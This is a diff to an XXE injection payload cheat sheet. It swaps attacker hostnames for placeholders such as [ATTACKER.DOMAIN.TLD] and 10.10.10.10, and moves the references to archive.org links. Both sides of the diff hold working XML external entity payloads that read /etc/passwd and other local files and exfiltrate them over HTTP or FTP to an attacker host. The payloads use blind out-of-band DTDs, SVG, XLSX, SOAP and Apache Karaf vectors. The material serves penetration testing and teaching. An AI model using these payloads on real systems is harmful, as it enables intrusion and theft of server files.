@@ -302,7 +302,7 @@ Payloads from [infosec-au/xxe-windows.md](https://gist.github.com/infosec-au/2c6
 ```xml
 <?xml version="1.0" ?>
 <!DOCTYPE message [
-    <!ENTITY % ext SYSTEM "http://attacker.com/ext.dtd">
+    <!ENTITY % ext SYSTEM "http://[ATTACKER.DOMAIN.TLD]/ext.dtd">
     %ext;
 ]>
 <message></message>
@@ -343,29 +343,29 @@ Sometimes you won't have a result outputted in the page but you can still extrac
 
 ### Basic Blind XXE
 
-The easiest way to test for a blind XXE is to try to load a remote resource such as a Burp Collaborator.
+The easiest way to test for a blind XXE is to try to load a remote resource such as a callback endpoint controlled by the tester.
 
 ```xml
 <?xml version="1.0" ?>
 <!DOCTYPE root [
-<!ENTITY % ext SYSTEM "http://UNIQUE_ID_FOR_BURP_COLLABORATOR.burpcollaborator.net/x"> %ext;
+<!ENTITY % ext SYSTEM "http://[ATTACKER.DOMAIN.TLD]/x"> %ext;
 ]>
 <r></r>
 ```
 
 ```xml
-<!DOCTYPE root [<!ENTITY test SYSTEM 'http://UNIQUE_ID_FOR_BURP_COLLABORATOR.burpcollaborator.net'>]>
+<!DOCTYPE root [<!ENTITY test SYSTEM 'http://[ATTACKER.DOMAIN.TLD]'>]>
 <root>&test;</root>
 ```
 
-Send the content of `/etc/passwd` to "www.malicious.com", you may receive only the first line.
+Send the content of `/etc/passwd` to `http://[ATTACKER.DOMAIN.TLD]`, you may receive only the first line.
 
 ```xml
 <?xml version="1.0" encoding="ISO-8859-1"?>
 <!DOCTYPE foo [
 <!ELEMENT foo ANY >
 <!ENTITY % xxe SYSTEM "file:///etc/passwd" >
-<!ENTITY callhome SYSTEM "www.malicious.com/?%xxe;">
+<!ENTITY callhome SYSTEM "http://[ATTACKER.DOMAIN.TLD]/?%xxe;">
 ]
 >
 <foo>&callhome;</foo>
@@ -377,12 +377,12 @@ Send the content of `/etc/passwd` to "www.malicious.com", you may receive only t
 
 ```xml
 <?xml version="1.0" encoding="utf-8"?>
-<!DOCTYPE data SYSTEM "http://publicServer.com/parameterEntity_oob.dtd">
+<!DOCTYPE data SYSTEM "http://[ATTACKER.DOMAIN.TLD]/parameterEntity_oob.dtd">
 <data>&send;</data>
 
-File stored on http://publicServer.com/parameterEntity_oob.dtd
+File stored on http://[ATTACKER.DOMAIN.TLD]/parameterEntity_oob.dtd
 <!ENTITY % file SYSTEM "file:///sys/power/image_size">
-<!ENTITY % all "<!ENTITY send SYSTEM 'http://publicServer.com/?%file;'>">
+<!ENTITY % all "<!ENTITY send SYSTEM 'http://[ATTACKER.DOMAIN.TLD]/?%file;'>">
 %all;
 ```
 
@@ -392,15 +392,15 @@ File stored on http://publicServer.com/parameterEntity_oob.dtd
 <?xml version="1.0" ?>
 <!DOCTYPE r [
 <!ELEMENT r ANY >
-<!ENTITY % sp SYSTEM "http://127.0.0.1/dtd.xml">
+<!ENTITY % sp SYSTEM "http://10.10.10.10/dtd.xml">
 %sp;
 %param1;
 ]>
 <r>&exfil;</r>
 
-File stored on http://127.0.0.1/dtd.xml
+File stored on http://10.10.10.10/dtd.xml
 <!ENTITY % data SYSTEM "php://filter/convert.base64-encode/resource=/etc/passwd">
-<!ENTITY % param1 "<!ENTITY exfil SYSTEM 'http://127.0.0.1/dtd.xml?%data;'>">
+<!ENTITY % param1 "<!ENTITY exfil SYSTEM 'http://10.10.10.10/dtd.xml?%data;'>">
 ```
 
 ### XXE OOB with Apache Karaf
@@ -412,7 +412,7 @@ CVE-2018-11788 affecting versions:
 
 ```xml
 <?xml version="1.0" encoding="UTF-8"?>
-<!DOCTYPE doc [<!ENTITY % dtd SYSTEM "http://27av6zyg33g8q8xu338uvhnsc.canarytokens.com"> %dtd;]
+<!DOCTYPE doc [<!ENTITY % dtd SYSTEM "http://[ATTACKER.DOMAIN.TLD]"> %dtd;]
 <features name="my-features" xmlns="http://karaf.apache.org/xmlns/features/v1.3.0" xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance"
         xsi:schemaLocation="http://karaf.apache.org/xmlns/features/v1.3.0 http://karaf.apache.org/xmlns/features/v1.3.0">
     <feature name="deployer" version="2.0" install="auto">
@@ -500,7 +500,7 @@ _xxe.svg_:
 <?xml version="1.0" standalone="yes"?>
 <!DOCTYPE svg [
 <!ELEMENT svg ANY >
-<!ENTITY % sp SYSTEM "http://example.org:8080/xxe.xml">
+<!ENTITY % sp SYSTEM "http://10.10.10.10:8080/xxe.xml">
 %sp;
 %param1;
 ]>
@@ -522,7 +522,7 @@ _xxe.xml_:
 
 ```xml
 <!ENTITY % data SYSTEM "php://filter/convert.base64-encode/resource=/etc/hostname">
-<!ENTITY % param1 "<!ENTITY exfil SYSTEM 'ftp://example.org:2121/%data;'>">
+<!ENTITY % param1 "<!ENTITY exfil SYSTEM 'ftp://10.10.10.10:2121/%data;'>">
 ```
 
 ### XXE Inside SOAP
@@ -530,7 +530,7 @@ _xxe.xml_:
 ```xml
 <soap:Body>
   <foo>
-    <![CDATA[<!DOCTYPE doc [<!ENTITY % dtd SYSTEM "http://x.x.x.x:22/"> %dtd;]><xxx/>]]>
+  <![CDATA[<!DOCTYPE doc [<!ENTITY % dtd SYSTEM "http://10.10.10.10:22/"> %dtd;]><xxx/>]]>
   </foo>
 </soap:Body>
 ```
@@ -591,13 +591,13 @@ cd XXE
 zip -r -u ../xxe.xlsx *
 ```
 
-Warning: Use `zip -u` (<https://infozip.sourceforge.net/Zip.html>) and not `7z u` / `7za u` (<https://p7zip.sourceforge.net/>) or `7zz` (<https://www.7-zip.org/>) because they won't recompress it the same way and many Excel parsing libraries will fail to recognize it as a valid Excel file. A valid  magic byte signature with (`file XXE.xlsx`) will be shown as `Microsoft Excel 2007+` (with `zip -u`) and an invalid one will be shown as `Microsoft OOXML`.
+Warning: Use `zip -u` (<https://infozip.sourceforge.net/Zip.html>) and not `7z u` / `7za u` (<https://p7zip.sourceforge.net/>) or `7zz` (<https://www.7-zip.org/>) because they won't recompress it the same way and many Excel parsing libraries will fail to recognize it as a valid Excel file. A valid  magic byte signature with (`file XXE.xlsx`) will be shown as `Microsoft Excel 2007+` (with `zip -u`) and an invalid one will be shown as `Microsoft OOXML`. Alternatively, with 7z you can specify the correct compression algorithm with: `7z a -tzip` to get the correct signature.
 
 Add your blind XXE payload inside `xl/workbook.xml`.
 
 ```xml
 <?xml version="1.0" encoding="UTF-8" standalone="yes"?>
-<!DOCTYPE cdl [<!ELEMENT cdl ANY ><!ENTITY % asd SYSTEM "http://x.x.x.x:8000/xxe.dtd">%asd;%c;]>
+<!DOCTYPE cdl [<!ELEMENT cdl ANY ><!ENTITY % asd SYSTEM "http://10.10.10.10:8000/xxe.dtd">%asd;%c;]>
 <cdl>&rrr;</cdl>
 <workbook xmlns="http://schemas.openxmlformats.org/spreadsheetml/2006/main" xmlns:r="http://schemas.openxmlformats.org/officeDocument/2006/relationships">
 ```
@@ -606,7 +606,7 @@ Alternatively, add your payload in `xl/sharedStrings.xml`:
 
 ```xml
 <?xml version="1.0" encoding="UTF-8" standalone="yes"?>
-<!DOCTYPE cdl [<!ELEMENT t ANY ><!ENTITY % asd SYSTEM "http://x.x.x.x:8000/xxe.dtd">%asd;%c;]>
+<!DOCTYPE cdl [<!ELEMENT t ANY ><!ENTITY % asd SYSTEM "http://10.10.10.10:8000/xxe.dtd">%asd;%c;]>
 <sst xmlns="http://schemas.openxmlformats.org/spreadsheetml/2006/main" count="10" uniqueCount="10"><si><t>&rrr;</t></si><si><t>testA2</t></si><si><t>testA3</t></si><si><t>testA4</t></si><si><t>testA5</t></si><si><t>testB1</t></si><si><t>testB2</t></si><si><t>testB3</t></si><si><t>testB4</t></si><si><t>testB5</t></si></sst>
 ```
 
@@ -618,7 +618,7 @@ And using FTP instead of HTTP allows to retrieve much larger files.
 
 ```xml
 <!ENTITY % d SYSTEM "file:///etc/passwd">
-<!ENTITY % c "<!ENTITY rrr SYSTEM 'ftp://x.x.x.x:2121/%d;'>">
+<!ENTITY % c "<!ENTITY rrr SYSTEM 'ftp://10.10.10.10:2121/%d;'>">
 ```
 
 Serve DTD and receive FTP payload using [staaldraad/xxeserv](https://github.com/staaldraad/xxeserv):
@@ -637,7 +637,7 @@ When all you control is the DTD file, and you do not control the `xml` file, XXE
 <!-- Load the contents of a sensitive file into a variable -->
 <!ENTITY % payload SYSTEM "file:///etc/passwd">
 <!-- Use that variable to construct an HTTP get request with the file contents in the URL -->
-<!ENTITY % param1 '<!ENTITY &#37; external SYSTEM "http://my.evil-host.com/x=%payload;">'>
+<!ENTITY % param1 '<!ENTITY &#37; external SYSTEM "http://[ATTACKER.DOMAIN.TLD]/x=%payload;">'>
 %param1;
 %external;
 ```
@@ -659,30 +659,30 @@ When all you control is the DTD file, and you do not control the `xml` file, XXE
 
 ## References
 
-- [A Deep Dive into XXE Injection - Trenton Gordon - July 22, 2019](https://www.synack.com/blog/a-deep-dive-into-xxe-injection/)
-- [Automating local DTD discovery for XXE exploitation - Philippe Arteau - July 16, 2019](https://www.gosecure.net/blog/2019/07/16/automating-local-dtd-discovery-for-xxe-exploitation)
-- [Blind OOB XXE At UBER 26+ Domains Hacked - Raghav Bisht - August 5, 2016](http://nerdint.blogspot.hk/2016/08/blind-oob-xxe-at-uber-26-domains-hacked.html)
-- [CVE-2019-8986: SOAP XXE in TIBCO JasperReports Server - Julien Szlamowicz, Sebastien Dudek - March 11, 2019](https://www.synacktiv.com/ressources/advisories/TIBCO_JasperReports_Server_XXE.pdf)
-- [Data exfiltration using XXE on a hardened server - Ritik Singh - January 29, 2022](https://infosecwriteups.com/data-exfiltration-using-xxe-on-a-hardened-server-ef3a3e5893ac)
-- [Detecting and exploiting XXE in SAML Interfaces - Christian Mainka (@CheariX) - November 6, 2014](http://web-in-security.blogspot.fr/2014/11/detecting-and-exploiting-xxe-in-saml.html)
-- [Exploiting XXE in file upload functionality - Will Vandevanter (@_will_is_) - November 19, 2015](https://www.blackhat.com/docs/webcast/11192015-exploiting-xml-entity-vulnerabilities-in-file-parsing-functionality.pdf)
-- [EXPLOITING XXE WITH EXCEL - Marc Wickenden - November 12, 2018](https://www.4armed.com/blog/exploiting-xxe-with-excel/)
-- [Exploiting XXE with local DTD files - Arseniy Sharoglazov - December 12, 2018](https://mohemiv.com/all/exploiting-xxe-with-local-dtd-files/)
-- [From blind XXE to root-level file read access - Pieter Hiele - December 12, 2018](https://www.honoki.net/2018/12/from-blind-xxe-to-root-level-file-read-access/)
-- [How we got read access on Google’s production servers - Detectify - April 11, 2014](https://blog.detectify.com/2014/04/11/how-we-got-read-access-on-googles-production-servers/)
-- [Impossible XXE in PHP - Aleksandr Zhurnakov - March 11, 2025](https://swarm.ptsecurity.com/impossible-xxe-in-php/)
-- [Midnight Sun CTF 2019 Quals - Rubenscube - jbz - April 6, 2019](https://jbz.team/midnightsunctfquals2019/Rubenscube)
-- [OOB XXE through SAML - Sean Melia (@seanmeals) - January 2016](https://seanmelia.files.wordpress.com/2016/01/out-of-band-xml-external-entity-injection-via-saml-redacted.pdf)
-- [Payloads for Cisco and Citrix - Arseniy Sharoglazov - January 1, 2016](https://mohemiv.com/all/exploiting-xxe-with-local-dtd-files/)
-- [Pentest XXE - @phonexicum - March 9, 2020](https://phonexicum.github.io/infosec/xxe.html)
-- [Playing with Content-Type – XXE on JSON Endpoints - Antti Rantasaari - April 20, 2015](https://www.netspi.com/blog/technical-blog/web-application-pentesting/playing-content-type-xxe-json-endpoints/)
-- [REDTEAM TALES 0X1: SOAPY XXE - Uncover and exploit XXE vulnerability in SOAP WS - Optistream - May 27, 2024](https://www.optistream.io/blogs/tech/redteam-stories-1-soapy-xxe)
+- [A Deep Dive into XXE Injection - Trenton Gordon - July 22, 2019](https://web.archive.org/web/20250511144639/https://www.synack.com/blog/a-deep-dive-into-xxe-injection/)
+- [Automating local DTD discovery for XXE exploitation - Philippe Arteau - July 16, 2019](https://web.archive.org/web/20240119113458/https://www.gosecure.net/blog/2019/07/16/automating-local-dtd-discovery-for-xxe-exploitation/)
+- [Blind OOB XXE At UBER 26+ Domains Hacked - Raghav Bisht - August 5, 2016](https://web.archive.org/web/20180215154806/https://nerdint.blogspot.hk:80/2016/08/blind-oob-xxe-at-uber-26-domains-hacked.html)
+- [CVE-2019-8986: SOAP XXE in TIBCO JasperReports Server - Julien Szlamowicz, Sebastien Dudek - March 11, 2019](https://web.archive.org/web/20191231121853/https://www.synacktiv.com/ressources/advisories/TIBCO_JasperReports_Server_XXE.pdf)
+- [Data exfiltration using XXE on a hardened server - Ritik Singh - January 29, 2022](https://web.archive.org/web/20221121024329/https://infosecwriteups.com/data-exfiltration-using-xxe-on-a-hardened-server-ef3a3e5893ac)
+- [Detecting and exploiting XXE in SAML Interfaces - Christian Mainka (@CheariX) - November 6, 2014](https://web.archive.org/web/20251209035938/http://web-in-security.blogspot.fr/2014/11/detecting-and-exploiting-xxe-in-saml.html)
+- [Exploiting XXE in file upload functionality - Will Vandevanter (@_will_is_) - November 19, 2015](https://web.archive.org/web/20260306153214/https://blackhat.com/docs/webcast/11192015-exploiting-xml-entity-vulnerabilities-in-file-parsing-functionality.pdf)
+- [EXPLOITING XXE WITH EXCEL - Marc Wickenden - November 12, 2018](https://web.archive.org/web/20260129040336/https://www.4armed.com/blog/exploiting-xxe-with-excel/)
+- [Exploiting XXE with local DTD files - Arseniy Sharoglazov - December 12, 2018](https://web.archive.org/web/20181213212434/https://mohemiv.com/all/exploiting-xxe-with-local-dtd-files/)
+- [From blind XXE to root-level file read access - Pieter Hiele - December 12, 2018](https://web.archive.org/web/20181212171659/https://www.honoki.net/2018/12/from-blind-xxe-to-root-level-file-read-access/)
+- [How we got read access on Google’s production servers - Detectify - April 11, 2014](https://web.archive.org/web/20230902033341/https://blog.detectify.com/2014/04/11/how-we-got-read-access-on-googles-production-servers/)
+- [Impossible XXE in PHP - Aleksandr Zhurnakov - March 11, 2025](https://web.archive.org/web/20260131091306/https://swarm.ptsecurity.com/impossible-xxe-in-php/)
+- [Midnight Sun CTF 2019 Quals - Rubenscube - jbz - April 6, 2019](https://web.archive.org/web/20260302041500/https://jbz.team/midnightsunctfquals2019/Rubenscube)
+- [OOB XXE through SAML - Sean Melia (@seanmeals) - February 5, 2017](https://web.archive.org/web/20170205151900/https://seanmelia.files.wordpress.com/2016/01/out-of-band-xml-external-entity-injection-via-saml-redacted.pdf)
+- [Payloads for Cisco and Citrix - Arseniy Sharoglazov - December 13, 2018](https://web.archive.org/web/20181213212434/https://mohemiv.com/all/exploiting-xxe-with-local-dtd-files/)
+- [Pentest XXE - @phonexicum - March 9, 2020](https://web.archive.org/web/20260306152955/https://phonexicum.github.io/infosec/xxe.html)
+- [Playing with Content-Type – XXE on JSON Endpoints - Antti Rantasaari - April 20, 2015](https://web.archive.org/web/20240615071332/https://www.netspi.com/blog/technical-blog/web-application-pentesting/playing-content-type-xxe-json-endpoints/)
+- [REDTEAM TALES 0X1: SOAPY XXE - Uncover and exploit XXE vulnerability in SOAP WS - Optistream - May 27, 2024](https://web.archive.org/web/20240527202144/https://www.optistream.io/blogs/tech/redteam-stories-1-soapy-xxe)
 - [XML attacks - Mariusz Banach (@mgeeky) - December 21, 2017](https://gist.github.com/mgeeky/4f726d3b374f0a34267d4f19c9004870)
-- [XML external entity (XXE) injection - PortSwigger - May 29, 2019](https://portswigger.net/web-security/xxe)
-- [XML External Entity (XXE) Processing - OWASP - December 4, 2019](https://www.owasp.org/index.php/XML_External_Entity_(XXE)_Processing)
-- [XML External Entity Prevention Cheat Sheet - OWASP - February 16, 2019](https://cheatsheetseries.owasp.org/cheatsheets/XML_External_Entity_Prevention_Cheat_Sheet.html)
-- [XXE ALL THE THINGS!!! (including Apple iOS's Office Viewer) - Bruno Morisson - August 14, 2015](https://labs.integrity.pt/articles/xxe-all-the-things-including-apple-ioss-office-viewer/)
-- [XXE in Uber to read local files - httpsonly - January 24, 2017](https://httpsonly.blogspot.hk/2017/01/0day-writeup-xxe-in-ubercom.html)
-- [XXE inside SVG - YEO QUAN YANG - June 22, 2016](https://quanyang.github.io/x-ctf-finals-2016-john-slick-web-25/)
+- [XML external entity (XXE) injection - PortSwigger - May 29, 2019](https://web.archive.org/web/20190529163105/https://portswigger.net/web-security/xxe)
+- [XML External Entity (XXE) Processing - OWASP - December 4, 2019](https://web.archive.org/web/20160309065737/https://www.owasp.org/index.php/XML_External_Entity_(XXE)_Processing)
+- [XML External Entity Prevention Cheat Sheet - OWASP - February 16, 2019](https://web.archive.org/web/20260306061747/https://cheatsheetseries.owasp.org/cheatsheets/XML_External_Entity_Prevention_Cheat_Sheet.html)
+- [XXE ALL THE THINGS!!! (including Apple iOS's Office Viewer) - Bruno Morisson - August 14, 2015](https://web.archive.org/web/20161111162257/https://labs.integrity.pt/articles/xxe-all-the-things-including-apple-ioss-office-viewer/)
+- [XXE in Uber to read local files - httpsonly - January 24, 2017](https://web.archive.org/web/20180701015455/https://httpsonly.blogspot.hk/2017/01/0day-writeup-xxe-in-ubercom.html)
+- [XXE inside SVG - YEO QUAN YANG - June 22, 2016](https://web.archive.org/web/20211016174500/https://quanyang.github.io/x-ctf-finals-2016-john-slick-web-25/)
 - [XXE payloads - Etienne Stalmans (@staaldraad) - July 7, 2016](https://gist.github.com/staaldraad/01415b990939494879b4)
-- [XXE: How to become a Jedi - Yaroslav Babin - November 6, 2018](https://2017.zeronights.org/wp-content/uploads/materials/ZN17_yarbabin_XXE_Jedi_Babin.pdf)
+- [XXE: How to become a Jedi - Yaroslav Babin - November 6, 2018](https://web.archive.org/web/20260306152956/https://2017.zeronights.org/wp-content/uploads/materials/ZN17_yarbabin_XXE_Jedi_Babin.pdf)
